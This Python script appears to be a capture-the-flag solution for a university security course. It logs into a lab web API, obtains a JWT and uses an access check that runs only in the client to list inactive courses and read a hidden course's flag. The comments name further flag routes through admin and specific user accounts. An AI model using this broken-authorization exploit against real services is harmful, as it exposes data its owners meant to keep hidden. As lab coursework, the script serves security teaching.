import requests

host = "itsec.sec.in.tum.de:7060"

# random user we created manually in advance
email = "testkjdaskjadskjasd@tum.de"
password = "123456"


# Looking at the source code, there are (seemingly) several ways to obtain (several different) flags.
# - We have the /api/flag endpoint which is only requestable as a user with admin permissions
# - We have the users flags which are accessible via the /api//api/my-profile endpoint, though require
#   to either be logged in as fabian@cool.invalid or uebungsleiter@itsec.sec.in.tum.de
# - and lastly we have the course flag, which is set as the requirement for a special/hidden course with
#   a unknown course identififer.


# The cool thing is that the api/courses endpoint just returns even the inactive courses
# as the "isActive" check is purely client side.

# This method retrieves a new JWT by calling the login route.
def retrieve_token():
    login = requests.post("http://{}/api/login".format(host), json={
        "email": email,
        "password": password
    })

    response = login.json()

    if response["status"] != "success":
        print("Something went wrong with the request {} {} {}".format(login.status_code, login.text, login.headers))
        return "ERROR"

    return response["token"]


def query_inactive_course(token):
    courses = requests.get("http://{}/api/courses".format(host),
                           headers={"Authorization": "Bearer {}".format(token)})

    data = courses.json()
    course_array = data["courses"]

    for course in course_array:
        if course["active"] == 0:
            return course["id"]

    return "<ERROR>"


def query_course_requirement(token, course_id):
    course = requests.get("http://{}/api/course/{}".format(host, course_id),
                          headers={"Authorization": "Bearer {}".format(token)})

    data = course.json()

    return data["course"]["requirements"]


t = retrieve_token()

cid = query_inactive_course(t)  # IN32380959916568

requirement = query_course_requirement(t, cid)

print(requirement)
